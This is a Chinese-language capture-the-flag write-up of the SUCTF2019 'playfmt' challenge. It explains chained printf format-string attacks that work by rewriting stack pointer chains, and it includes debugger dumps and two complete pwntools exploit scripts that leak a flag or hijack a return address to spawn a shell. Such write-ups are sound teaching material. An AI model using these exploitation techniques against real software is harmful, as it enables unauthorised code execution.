#  SUCTF2019-playfmt-printf的成链攻击

首先检查一下程序

```c
syc@ubuntu:~/Desktop/share/tmp/playfmt$ checksec playfmt
[*] '/mnt/hgfs/share/tmp/playfmt/playfmt'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabledx
    PIE:      No PIE (0x8048000)
```

可以知道我们无法修改got表，栈上的代码不可执行，尝试执行一下

```
syc@ubuntu:~/Desktop/share/tmp/playfmt$ ./playfmt
open flag error , please contact the administrator!
```

```c
syc@ubuntu:~/Desktop/share/tmp/playfmt$ ./playfmt
Testing my C++ skills...
testing 1...
hello,world
testing 2...
hello,world
testing 3...
You think I will leave the flag?
hello,world
=====================
  Magic echo Server
=====================
```

用IDA Pro查看一下源代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  derived *v3; // ebx
  derived *v4; // ebx
  derived *v5; // ebx
  int v6; // ST2C_4
  char *v8; // [esp+0h] [ebp-24h]
  FILE *stream; // [esp+4h] [ebp-20h]

  v8 = (char *)malloc(0x10u);
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("open flag error , please contact the administrator!");
    exit(0);
  }
  fscanf(stream, "%s", v8);
  fclose(stream);
  puts("Testing my C++ skills...");
  puts("testing 1...");
  v3 = (derived *)operator new(8u);
  derived::derived(v3, 0);
  if ( v3 )
  {
    derived::~derived(v3);
    operator delete((void *)v3);
  }
  puts("testing 2...");
  v4 = (derived *)operator new(8u);
  derived::derived(v4);
  if ( v4 )
  {
    derived::~derived(v4);
    operator delete((void *)v4);
  }
  puts("testing 3...");
  v5 = (derived *)operator new(8u);
  derived::derived(v5, v8);
  puts("You think I will leave the flag?");
  if ( v5 )
  {
    base::~base(v5);
    operator delete((void *)v5);
  }
  v6 = Get_return_addr();
  setvbuf(stdout, 0, 2, 0);
  logo();
  if ( Get_return_addr() != v6 )
    exit(0);
  return 0;
}
```

找到关键功能函数**logo**

```cC
bool logo(void)
{
  int v0; // ST1C_4
  bool result; // al

  v0 = Get_return_addr();
  puts("=====================");
  puts("  Magic echo Server");
  puts("=====================");
  do_fmt();
  result = Get_return_addr() != v0;
  if ( result )
    exit(0);
  return result;
}
```

找到漏洞点**do_fmt**

```c
int do_fmt(void)
{
  int result; // eax

  while ( 1 )
  {
    read(0, buf, 0xC8u);
    result = strncmp(buf, "quit", 4u);
    if ( !result )
      break;
    printf(buf);
  }
  return result;
}
```

 程序漏洞点比较明显，直接写了一个循环的`printf`格式化漏洞，而输入的数据是存储在`buf`指针上

```shell
syc@ubuntu:~/Desktop/share/tmp/playfmt$ readelf -S playfmt
There are 30 section headers, starting at offset 0x2c44:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 0000b4 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          08048260 000260 000190 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080483f0 0003f0 000159 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804854a 00054a 000032 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0804857c 00057c 000060 00   A  6   2  4
  [ 9] .rel.dyn          REL             080485dc 0005dc 000098 08   A  5   0  4
  [10] .rel.plt          REL             08048674 000674 000008 08  AI  5  23  4
  [11] .init             PROGBITS        0804867c 00067c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080486a0 0006a0 000020 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080486c0 0006c0 000090 00  AX  0   0  8
  [14] .text             PROGBITS        08048750 000750 000532 00  AX  0   0 16
  [15] .fini             PROGBITS        08048c84 000c84 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048c98 000c98 0000e9 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048d84 000d84 00007c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048e00 000e00 000218 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      0804ae98 001e98 000008 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      0804aea0 001ea0 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        0804aea4 001ea4 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         0804aea8 001ea8 000100 08  WA  6   0  4
  [23] .got              PROGBITS        0804afa8 001fa8 000058 04  WA  0   0  4
  [24] .data             PROGBITS        0804b000 002000 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804b020 002008 0000ec 00  WA  0   0 32
  [26] .comment          PROGBITS        00000000 002008 000035 01  MS  0   0  1
  [27] .shstrtab         STRTAB          00000000 002b40 000101 00      0   0  1
  [28] .symtab           SYMTAB          00000000 002040 000660 10     29  49  4
  [29] .strtab           STRTAB          00000000 0026a0 0004a0 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

`buf`则是位于**bss**段中地址为**0x0804B040**

```c
.bss:0804B040                 public buf
.bss:0804B040 ; char buf[200]
.bss:0804B040 buf             db 0C8h dup(?)    ; DATA XREF: do_fmt(void)+E↑o
```

 所以思路就是直接修改栈上的返回地址，`return`的时候劫持流程

我们首先复习一下格式化字符

格式化字符串漏洞的具体原理就不再详细叙述，这里主要简单介绍一下格式化参数位置的计算和漏洞利用时常用的格式字符。

- 参数位置计算

linux下32位程序是栈传参，从左到右参数顺序为`$esp+4,$esp+8,...`；因此`$esp+x`的位置应该是格式化第`x/4`个参数。

linux下64位程序是寄存器加栈传参，从左到右参数顺序为`$rdi,$rsi,$rdx,$rcx,$r8,$r9,$rsp+8,...`；因此`$rsp+x`的位置应该是格式化第`x/8+6`个参数。

- 常用的格式化字符

用于地址泄露的格式化字符有：`%x、%s、%p`等；

用于地址写的格式化字符：`%hhn`（写入一字节），`%hn`（写入两字节），`%n`（32位写四字节，64位写8字节）；

`%< number>$type`：直接作用第number个位置的参数，如：`%7$x`读第7个位置参数值，`%7$n`对第7个参数位置进行写。

`%c`：输出**number**个字符，配合`%n`进行任意地址写，例如`"%{}c%{}$hhn".format(address,offset)`就是向`offset0`参数指向的地址最低位写成`address`

一般来说，栈上的格式化字符串漏洞利用步骤是先泄露地址，包括**ELF**程序地址和**libc**地址；然后将需要改写的**GOT**表地址直接传到栈上，同时利用`%c%n`的方法改写入`system或one_gadget`地址，最后就是劫持流程。但是对于**BSS**段或是堆上格式化字符串，无法直接将想要改写的地址指针放置在栈上，也就没办法实现任意地址写。 

那我们就先下一个断点在printf执行之前，看看栈上有什么可以利用的东西

```c
pwndbg> stack
00:0000│ esp  0xffffd030 —▸ 0x804b040 (buf) ◂— 0xa /* '\n' */
01:0004│      0xffffd034 —▸ 0x8048cac ◂— jno    0x8048d23 /* 'quit' */
02:0008│      0xffffd038 ◂— 0x4
03:000c│      0xffffd03c —▸ 0x80488e8 (logo()+59) ◂— add    esp, 0x10
04:0010│      0xffffd040 —▸ 0x8048cb1 ◂— cmp    eax, 0x3d3d3d3d /* '=====================' */
05:0014│      0xffffd044 —▸ 0x8048ac4 (main+440) —▸ 0xfffd82e8 ◂— 0x0
06:0018│ ebp  0xffffd048 —▸ 0xffffd068 —▸ 0xffffd098 ◂— 0x0
07:001c│      0xffffd04c —▸ 0x80488f0 (logo()+67) —▸ 0xffff56e8 ◂— 0x0
08:0020│      0xffffd050 —▸ 0xf7e30000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c
```

```c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x804a000 r-xp     2000 0      /mnt/hgfs/share/tmp/playfmt/playfmt
 0x804a000  0x804b000 r--p     1000 1000   /mnt/hgfs/share/tmp/playfmt/playfmt
 0x804b000  0x804c000 rw-p     1000 2000   /mnt/hgfs/share/tmp/playfmt/playfmt
 0x804c000  0x806e000 rw-p    22000 0      [heap]
0xf7b36000 0xf7b38000 rw-p     2000 0      
0xf7b38000 0xf7b54000 r-xp    1c000 0      /lib/i386-linux-gnu/libgcc_s.so.1
0xf7b54000 0xf7b55000 r--p     1000 1b000  /lib/i386-linux-gnu/libgcc_s.so.1
0xf7b55000 0xf7b56000 rw-p     1000 1c000  /lib/i386-linux-gnu/libgcc_s.so.1
0xf7b56000 0xf7c56000 r-xp   100000 0      /lib/i386-linux-gnu/libm-2.27.so
0xf7c56000 0xf7c57000 r--p     1000 ff000  /lib/i386-linux-gnu/libm-2.27.so
0xf7c57000 0xf7c58000 rw-p     1000 100000 /lib/i386-linux-gnu/libm-2.27.so
0xf7c58000 0xf7e2d000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7e2d000 0xf7e2e000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7e2e000 0xf7e30000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7e30000 0xf7e31000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7e31000 0xf7e34000 rw-p     3000 0      
0xf7e34000 0xf7fb0000 r-xp   17c000 0      /usr/lib32/libstdc++.so.6.0.25
0xf7fb0000 0xf7fb6000 r--p     6000 17b000 /usr/lib32/libstdc++.so.6.0.25
0xf7fb6000 0xf7fb7000 rw-p     1000 181000 /usr/lib32/libstdc++.so.6.0.25
0xf7fb7000 0xf7fba000 rw-p     3000 0      
0xf7fd0000 0xf7fd2000 rw-p     2000 0      
0xf7fd2000 0xf7fd5000 r--p     3000 0      [vvar]
0xf7fd5000 0xf7fd6000 r-xp     1000 0      [vdso]
0xf7fd6000 0xf7ffc000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7ffc000 0xf7ffd000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7ffd000 0xf7ffe000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xfff00000 0xffffe000 rw-p    fe000 0      [stack]
```

首先需要得到当前栈的地址和`libc`的基地址，这些地址可以很轻松的在栈上找到

不难发现栈上有libc地址

```
0xf7e30000 0xf7e31000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
```

```
08:0020│      0xffffd050 —▸ 0xf7e30000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c
```

可知`esp+0x18`存放了栈地址，`esp+0x20`存放了`libc`的地址，根据32位栈溢出的公式可以得知

```
esp+0x18 : 0x18 / 4 = 8
esp+0x20 : 0x20 / 4 = 8
```

可以得到分别是第6个参数和第8个参数，直接传入`%6$p%8$p`即可得到栈地址和`libc`地址

**printf**成链攻击的缺点就是需要很多次**printf**，但是如果你有任意地址读写权限后，相信做到这一点也并非难事 

这里主要需要解决的就是如何将要改写的地址放在栈上。实现任意地址写需要依赖栈上存在一个链式结构

```
0xffffd048->0xffffd068->0xffffd098
```

这三个地址都在栈上，我们就可以利用`printf`的`%n`对不同链层的数据进行修改，从而使得这条数据链可以指向任意地址 

下图是一个简单的栈地址空间图，`offset`表示格式化的参数位置。通过第`offset0`个参数，利用`%hhn`可以控制`address1`的最低位，再通过第`offset1`个参数，利用`%hhn`可以写`address2`的最低位；然后通过`offset0`参数，利用`%hhn`修改`address1`的最低位为`原始值+1`，再通过`offset1`参数，利用`%hhn`可以写`address2`的次低位；依次循环即可完全控制`address2`的值，再次利用`address1和address2`的链式结构，即可实现对`address2`地址空间的任意写。对应到上面显示的地址空间

```
address0=0xffffd048,offset0=0x18/4=6;
address1=0xffffd068,offset1=0x38/4=14;
address2=0xffffd098,offset2=0x68/4=26;
```

 ![img](https://p1.ssl.qhimg.com/t01027399ee82efa5dd.png) 

这里我用上面的数据链简单举个例，我们可以利用`0xffffd068—▸ 0xffffd098◂— 0x0`来修改`0xffffd098`地址的数据，但是`printf`的`%n`最大只能修改到`0x2000`，也就是说我们一般只能修改`一个byte`，原本这并没有什么用，但是别忘了，这是一条完整的数据链，我们可以利用`ebp  0xffffd048—▸ 0xffffd068—▸ 0xffffd098`修改`0xffffd068`的低地址数据（`0xffffd098`）的低地址，简单来说就是修改为`0xffffd099`，然后 `0xffffd068 —▸ 0xffffd098◂— 0x0`就会变成`0xffffd068 —▸ 0xffffd099◂— 0x0`，接下来我们就可以利用这条链修改`0xffffd099`地址的值，也就是`第二个byte`，依次类推，我们就能在栈上写任意地址，然后在用栈上的地址进行任意读写。就这样往往复复，造成了这个恶性循环。 

简单来说就是一条栈数据链，前面的链功能是修改我们要任意读写的地址，后面的链的功能则是对前面修改出来的地址进行任意读写。 

下面是地址写代码的实现，首先获取`address1`的最低位的原始值，然后依次写`address2`的各个字节

```
def write_address(off0,off1,target_addr):
    io.sendline("%{}$p".format(off1))
    io.recvuntil("0x")
    addr1 = int(io.recv(8),16)&0xff
    io.recv()
    for i in range(4):
        io.sendline("%{}c%{}$hhn".format(addr1+i,off0))
        io.recv()
        io.sendline("%{}c%{}$hhn".format(target_addr&0xff,off1))
        io.recv()        
        target_addr=target_addr>>8
    io.sendline("%{}c%{}$hhn".format(addr1,off0))
    io.recv()
```

这里需要介绍一下**one_gadget**

**one-gadget** 是glibc里调用`execve('/bin/sh', NULL, NULL)`的一段非常有用的**gadge**t。在我们能够控制**ip**（也就是**pc**）的时候，用**one-gadge**t来做**RCE**（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用`system("sh")`，这个时候**one gadget**就可以搞定 

再次运行`write_address`将`0xfff566cc`写上`one_gadget`地址

最后输入`quit`退出循环，执行`return result`时就能获取shell

由于我没拿到题目的**libc**，也没法真正的去做题所以大概就是先了解一下，借用一下别人的EXP

官方EXP，里面有很多很方便值得学习的格式化字符串函数可以学习一下

```python
    from pwn import *
    # context.log_level = "debug"
    do_fmt_ebp_offset = 6
    play_ebp_offset = 14
    main_ebp_offset = 26
    def format_offset(format_str , offset):
        return format_str.replace("{}" , str(offset))
    def get_target_offset_value(offset , name):
        payload = format_offset("%{}$p\x00" , offset)
        p.sendline(payload)
        text = p.recv()
        try:
            value = int(text.split("\n")[0] , 16)
              print(name + " : " + hex(value))
            return value
        except Exception, e:
            print text
    def modify_last_byte(last_byte , offset):
        payload = "%" + str(last_byte) + "c" + format_offset("%{}$hhn" , offset)
        p.sendline(payload)
        p.recv()
    def modify(addr , value , ebp_offset , ebp_1_offset):
        addr_last_byte = addr & 0xff
        for i in range(4):
            now_value = (value >> i * 8) & 0xff
            modify_last_byte(addr_last_byte + i ,  ebp_offset)
            modify_last_byte(now_value , ebp_1_offset)
    p = process("./playfmt")
    elf = ELF("./playfmt")
    p.recvuntil("=\n")
    p.recvuntil("=\n")
    # leak ebp_1_addr then get ebp_addr
    play_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  "logo_ebp") 
    # get_ebp_addr
    main_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  "main_ebp")
    # flag_class_ptr_addr = main_ebp_addr + 0x10
    # flag_class_ptr_offset = main_ebp_offset - 4
    flag_class_ptr_offset = 19
    flag_addr = get_target_offset_value(flag_class_ptr_offset , "flag_addr") - 0x420
    log.info(hex(flag_addr))
    # puts_plt = elf.plt["puts"]
    modify(main_ebp_addr + 4 , flag_addr , do_fmt_ebp_offset , play_ebp_offset)
    # gdb.attach(p)
    payload = format_offset("%{}$s\x00" , play_ebp_offset + 1)
    p.send(payload)
    # log.info("flag_addr : " + hex(flag_addr))
    # p.sendline("quit")
    p.interactive()
```

另一种EXP

```python
# coding=utf-8
from pwn import *
#io = remote('120.78.192.35', 9999)
io = process("./playfmt")
elf = ELF('./playfmt')
libc = ELF('/lib32/libc-2.23.so')
#context.log_level = 'DEBUG'
#gdb.attach(io,"b *0x0804889f")
io.recv()
io.sendline("%6$p%8$p")
io.recvuntil("0x")
stack_addr = int(io.recv(8),16)-0xffffd648+0xffffd610
io.recvuntil("0x")
libc.address = int(io.recv(8),16)-0xf7e41000+0xf7c91000
log.success("stack_addr:"+hex(stack_addr))
log.success("libc_addr:"+hex(libc.address))
io.recv()
offset0=0x18/4
offset1=0x38/4
offset2=0x68/4
def write_address(off0,off1,target_addr):
    io.sendline("%{}$p".format(off1))
    io.recvuntil("0x")
    addr1 = int(io.recv(8),16)&0xff
    io.recv()
    for i in range(4):
        io.sendline("%{}c%{}$hhn".format(addr1+i,off0))
        io.recv()
        io.sendline("%{}c%{}$hhn".format(target_addr&0xff,off1))
        io.recv()        
        target_addr=target_addr>>8
    io.sendline("%{}c%{}$hhn".format(addr1,off0))
    io.recv()

one_gadget = libc.address+ 0x5f065
print(hex(one_gadget))
write_address(offset0,offset1,stack_addr+0x1c)
#gdb.attach(io,"b *0x0804889f")
write_address(offset1,offset2,one_gadget)
io.sendline("quit")
io.interactive()
```

> 注意：这里我特别强调一点，在单次`printf`操作中，是没有办法完成printf成链攻击的，因为单次`printf`时，一旦你对已经修改过的地址的值进行修改时，则要不就直接`crash`，要不就根本没反应，所以一定要多次`printf`才能完成该攻击方式。这是我自己尝试过的，然后单次就能完成printf成链攻击，那么这将是一个非常致命的漏洞 

接下来简单说一下利用方式，`printf`成链攻击的实施一般至少需要两次`printf`才行（除非你运气好到爆棚，恰好有一个地址指向了函数的返回地址），第一次我们可以使`栈数据链`指向某个函数的返回地址，一般为了简单我们可以直接指向第二次`printf`的返回地址，由于栈布局是固定的，我们确实可以预测其返回地址。然后第二次printf操作时，便可以劫持其返回地址，然后重新返回`main`或者指向一个可以让`printf`复用的地址，然后我们就可以重复使用`printf`实现任意地址读写，这样就完成了一次`printf`成链攻击。 

> 参考文章
>
> 【1】非栈上格式化字符串漏洞利用技巧 ：https://www.anquanke.com/post/id/184717
>
> 【2】printf 成链攻击 ：http://blog.eonew.cn/archives/1196